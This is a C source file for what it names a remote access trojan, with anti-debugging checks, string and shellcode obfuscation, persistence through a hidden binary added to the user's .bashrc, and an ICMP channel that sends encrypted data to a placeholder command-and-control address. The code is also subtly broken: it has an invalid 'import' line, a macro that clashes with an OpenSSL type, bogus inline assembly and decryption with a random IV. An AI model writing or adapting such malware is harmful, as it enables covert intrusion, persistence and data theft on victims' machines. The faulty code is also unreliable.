#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
import <signal.h>
#include <fcntl.h>
#include <sys/stat.h>

#define AES_KEY "0123456789abcdef"
#define ICMP_PAYLOAD_SIZE 64

void obfuscate_string(char *str, char key) {
    while (*str) {
        *str = (*str ^ key) << 1 | (*str ^ key) >> 7;
        str++;
    }
}

void deobfuscate_string(char *str, char key) {
    while (*str) {
        *str = (*str >> 1 | *str << 7) ^ key;
        str++;
    }
}

void anti_debug() {
    __asm__ __volatile__ (
        "xor %eax, %eax\n\t"
        "mov $0x1, %eax\n\t"
        "int $0x80\n\t"
        "cmp %eax, $0x0\n\t"
        "jne _debugged\n\t"
        "_not_debugged:\n\t"
        "jmp _end\n\t"
        "_debugged:\n\t"
        "mov $0x1, %eax\n\t"
        "int $0x80\n\t"
        "_end:\n\t"
    );
    if (getppid() != 1) exit(1);
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) exit(1);

    char *env_var = getenv("SOME_ENV_VAR");
    if (env_var == NULL || strcmp(env_var, "expected_value") != 0) {
        exit(1);
    }
}

void mutate_shellcode(unsigned char* shellcode, size_t length) {
    unsigned char key = rand() % 256;
    for (size_t i = 0; i < length; i++) {
        shellcode[i] = (shellcode[i] ^ key) << 1 | (shellcode[i] ^ key) >> 7;
    }
}

void aes_encrypt(unsigned char *plaintext, unsigned char *key, unsigned char *ciphertext) {
    AES_KEY enc_key;
    unsigned char iv[AES_BLOCK_SIZE];
    RAND_bytes(iv, AES_BLOCK_SIZE);
    AES_set_encrypt_key(key, 128, &enc_key);
    AES_cfb128_encrypt(plaintext, ciphertext, strlen((char *)plaintext), &enc_key, iv, NULL, AES_ENCRYPT);
}

void aes_decrypt(unsigned char *ciphertext, unsigned char *key, unsigned char *plaintext) {
    AES_KEY dec_key;
    unsigned char iv[AES_BLOCK_SIZE];
    RAND_bytes(iv, AES_BLOCK_SIZE);
    AES_set_decrypt_key(key, 128, &dec_key);
    AES_cfb128_encrypt(ciphertext, plaintext, strlen((char *)ciphertext), &dec_key, iv, NULL, AES_DECRYPT);
}

unsigned short checksum(void *b, int len) {    
    unsigned short *buf = b; 
    unsigned int sum=0; 
    unsigned short result; 

    for (sum = 0; len > 1; len -= 2) 
        sum += *buf++; 
    if (len == 1) 
        sum += *(unsigned char*)buf; 
    sum = (sum >> 16) + (sum & 0xFFFF); 
    sum += (sum >> 16); 
    result = ~sum; 
    return result; 
}

void send_ping(const char *target_ip, const char *message) {
    int sockfd;
    struct sockaddr_in addr;
    struct icmp icmp_hdr;
    char buffer[ICMP_PAYLOAD_SIZE];

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip, &addr.sin_addr);

    memset(&icmp_hdr, 0, sizeof(icmp_hdr));
    icmp_hdr.icmp_type = ICMP_ECHO;
    icmp_hdr.icmp_code = 0;
    icmp_hdr.icmp_id = getpid();
    icmp_hdr.icmp_seq = 1;
    icmp_hdr.icmp_cksum = 0;

    memset(buffer, 0, sizeof(buffer));
    strcpy(buffer, message);

    memcpy(buffer, &icmp_hdr, sizeof(icmp_hdr));
    icmp_hdr.icmp_cksum = checksum(buffer, sizeof(buffer));
    memcpy(buffer, &icmp_hdr, sizeof(icmp_hdr));

    if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&addr, sizeof(addr)) <= 0) {
        perror("Sendto failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    close(sockfd);
}

void receive_ping() {
    int sockfd;
    struct sockaddr_in addr;
    char buffer[1024];
    socklen_t addr_len;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    addr_len = sizeof(addr);
    if (recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&addr, &addr_len) <= 0) {
        perror("Recvfrom failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    struct icmp *icmp_hdr = (struct icmp*)(buffer + sizeof(struct iphdr));
    if (icmp_hdr->icmp_type == ICMP_ECHOREPLY) {
        printf("Received ICMP ECHO REPLY: %s\n", buffer + sizeof(struct iphdr) + sizeof(struct icmp));
    }

    close(sockfd);
}

void setup_persistence() {
    char *home = getenv("HOME");
    char *dest = malloc(strlen(home) + strlen("/.local/bin/.rat") + 1);
    strcpy(dest, home);
    strcat(dest, "/.local/bin/.rat");

    char *src = "/path/to/rat";  // Path to the compiled RAT executable
    struct stat st;
    if (stat(dest, &st) != 0) {
        int src_fd = open(src, O_RDONLY);
        int dest_fd = open(dest, O_CREAT | O_WRONLY, S_IRUSR | S_IWUSR | S_IXUSR);
        char buf[1024];
        ssize_t bytes;
        while ((bytes = read(src_fd, buf, sizeof(buf))) > 0) {
            write(dest_fd, buf, bytes);
        }
        close(src_fd);
        close(dest_fd);
    }

    char *rc_file = malloc(strlen(home) + strlen("/.bashrc") + 1);
    strcpy(rc_file, home);
    strcat(rc_file, "/.bashrc");
    FILE *f = fopen(rc_file, "a");
    fprintf(f, "%s\n", dest);
    fclose(f);

    free(dest);
    free(rc_file);
}

void execute_task(const char* task) {
    unsigned char key[16] = AES_KEY;

    void (*enc_dec_func)(unsigned char*, unsigned char*, unsigned char*) = aes_encrypt;

    if (strcmp(task, "encrypt") == 0) {
        unsigned char plaintext[64] = "Sensitive data";
        unsigned char ciphertext[64];
        enc_dec_func(plaintext, key, ciphertext);
        printf("Encrypted: %s\n", ciphertext);
    } else if (strcmp(task, "decrypt") == 0) {
        enc_dec_func = aes_decrypt;
        unsigned char ciphertext[64] = "EncryptedData";
        unsigned char plaintext[64];
        enc_dec_func(ciphertext, key, plaintext);
        printf("Decrypted: %s\n", plaintext);
    } else if (strcmp(task, "task1") == 0) {
        printf("Executing advanced task 1\n");
    } else if (strcmp(task, "task2") == 0) {
        printf("Executing advanced task 2\n");
    } else {
        printf("Unknown task\n");
    }
}

int main(int argc, char *argv[]) {
    anti_debug();
    setup_persistence();

    if (argc > 1) {
        srand(time(NULL));

        unsigned char shellcode[] = "\x31\xc0\xb0\x01\x31\xdb\xcd\x80";  // Example shellcode
        mutate_shellcode(shellcode, sizeof(shellcode) - 1);
        printf("Mutated Shellcode: ");
        for (size_t i = 0; i < sizeof(shellcode) - 1; i++) {
            printf("\\x%02x", shellcode[i]);
        }
        printf("\n");

        char encrypted_message[ICMP_PAYLOAD_SIZE];
       

 aes_encrypt((unsigned char*)argv[1], (unsigned char*)AES_KEY, (unsigned char*)encrypted_message);
        send_ping("127.0.0.1", encrypted_message);  // Replace with C2 server IP
        receive_ping();
    } else {
        printf("No task provided\n");
    }
    return 0;
}
